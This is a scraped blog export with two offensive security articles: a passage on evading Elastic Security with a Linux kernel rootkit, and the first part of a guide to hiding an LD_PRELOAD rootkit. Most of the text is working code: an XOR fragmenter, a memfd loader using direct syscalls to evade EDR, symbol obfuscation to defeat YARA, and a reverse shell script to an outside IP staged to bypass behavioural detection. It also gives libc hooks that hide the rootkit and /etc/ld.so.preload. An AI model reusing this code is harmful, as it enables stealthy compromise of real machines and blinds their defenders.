bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function 